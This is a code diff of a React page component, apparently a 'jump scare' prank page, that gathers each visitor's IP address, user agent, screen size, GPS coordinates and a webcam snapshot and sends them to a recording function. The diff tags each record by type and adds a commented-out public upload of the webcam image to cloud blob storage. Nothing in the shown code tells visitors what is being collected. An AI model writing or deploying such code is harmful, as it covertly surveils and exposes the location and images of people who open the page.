@@ -2,6 +2,8 @@
 
 import { useEffect, useState, useRef } from "react";
 import record from "./record";
+import { put } from "@vercel/blob";
+
 
 export default function Home() {
   const [showJumpScare, setShowJumpScare] = useState(false);
@@ -26,20 +28,20 @@ export default function Home() {
       additional["userAgent"] = navigator.userAgent
       additional["screenResolution"] = `${window.innerWidth}x${window.innerHeight}`
       additional["navigator"] = navigator
-      record(JSON.stringify(additional))
+      record("additional", JSON.stringify(additional))
       console.log(ip)
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((position) => {
           setTimeout(() => {
-            record(JSON.stringify([position.coords.latitude, position.coords.longitude]))
+            record("gps", JSON.stringify([position.coords.latitude, position.coords.longitude]))
           }, 1000)
 
         },
           (error) => {
-            record(JSON.stringify([error]))
+            record("error", JSON.stringify([error]))
           });
       } else {
-        record("Geolocation is not supported by this browser.");
+        record("error", "Geolocation is not supported by this browser.");
       }
 
 
@@ -54,20 +56,22 @@ export default function Home() {
 
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
-        setTimeout(() => {
+        setTimeout(async () => {
           const canvas = canvasRef.current;
           canvas.width = videoRef.current.videoWidth;
           canvas.height = videoRef.current.videoHeight;
           canvas.getContext('2d').drawImage(videoRef.current, 0, 0);
 
           const base64 = canvas.toDataURL("image/png");
-          record(JSON.stringify({ image: base64 }))
+          record("img", JSON.stringify({ image: base64 }))
           // alert(base64)
-          console.log(base64)
+          // console.log(base64)
+          // const { url } = await put(Math.random().toString().slice(2,), base64, { access: 'public' });
+
         }, 1000)
       }
     } catch (error) {
-      record("Error accessing the camera: ", error);
+      record("error", "Error accessing the camera: " + error);
     }
   };
 
